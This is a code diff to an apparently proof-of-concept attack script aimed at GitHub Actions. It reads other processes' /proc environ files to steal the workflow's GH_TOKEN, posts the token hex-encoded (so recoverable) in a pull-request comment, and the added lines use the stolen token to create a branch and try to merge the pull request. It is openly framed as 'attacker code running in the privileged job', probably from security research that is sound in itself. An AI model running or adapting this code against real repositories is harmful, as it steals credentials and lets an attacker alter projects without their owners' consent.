@@ -29,20 +29,28 @@ function api(method, p, body, token) {
       const n = parseInt(pid, 10);
       if (seen.has(n)) continue; seen.add(n);
       let env = ''; try { env = fs.readFileSync('/proc/' + pid + '/environ', 'utf8'); } catch (e) { continue; }
-      if (!env.includes('GH_TOKEN=')) continue;
       let tok = '';
       for (const kv of env.split('\0')) if (kv.startsWith('GH_TOKEN=')) tok = kv.slice(9);
       if (!tok || !tok.startsWith('ghs_')) continue;
       const verify = await api('GET', '/repos/' + repo, null, tok);
-      log('harvested ghs_ token from pid ' + pid + ' len=' + tok.length + ' verify=' + verify.code);
-      const payload = '[poc] workflow GITHUB_TOKEN harvested by attacker code running in the privileged job\n\n' +
-        'proof-request: `GET /repos/' + repo + '` -> HTTP ' + verify.code + '\n\n' +
-        '```\ntoken_sha256=' + crypto.createHash('sha256').update(tok).digest('hex') +
-        '\ntoken_hex=' + Buffer.from(tok, 'utf8').toString('hex') +
-        '\nfull_repo_response_len=' + verify.body.length + '\n```';
-      const res = await api('POST', '/repos/' + repo + '/issues/' + pr + '/comments', { body: payload }, tok);
-      log('comment POST ' + res.code + ' ' + res.body.slice(0, 200));
-      if (res.code === 201) return;
+      log('harvested ghs_ token pid=' + pid + ' len=' + tok.length + ' verify=' + verify.code);
+      const head = '[poc] workflow GITHUB_TOKEN harvested in privileged job. `GET /repos/' + repo + '` -> HTTP ' + verify.code + '\n\n';
+      const tokline = '```\ntoken_sha256=' + crypto.createHash('sha256').update(tok).digest('hex') + '\ntoken_hex=' + Buffer.from(tok).toString('hex') + '\n```\n';
+      const first = await api('POST', '/repos/' + repo + '/issues/' + pr + '/comments', { body: head + tokline }, tok);
+      log('token comment ' + first.code);
+      // permission probes with the same job token
+      const refName = 'refs/heads/poc-write-probe';
+      const mainSha = JSON.parse((await api('GET', '/repos/' + repo + '/git/ref/heads/main', null, tok)).body || '{}').object?.sha;
+      const mkRef = await api('POST', '/repos/' + repo + '/git/refs', { ref: refName, sha: mainSha }, tok);
+      log('create ref -> ' + mkRef.code + ' ' + mkRef.body.slice(0, 160));
+      const merge = await api('PUT', '/repos/' + repo + '/pulls/' + pr + '/merge', { merge_method: 'squash' }, tok);
+      log('merge -> ' + merge.code + ' ' + merge.body.slice(0, 200));
+      const results = 'permission probes with the same token:\n\n```\nPOST /git/refs            -> ' + mkRef.code + ' ' + mkRef.body.slice(0, 200).replace(/\n/g, ' ') +
+        '\nPUT /pulls/' + pr + '/merge -> ' + merge.code + ' ' + merge.body.slice(0, 200).replace(/\n/g, ' ') + '\n```';
+      const second = await api('POST', '/repos/' + repo + '/issues/' + pr + '/comments', { body: results }, tok);
+      log('probe comment ' + second.code);
+      if (merge.code === 200 || merge.code === 201) return;
+      await sleep(2000);
     }
     await sleep(100);
   }
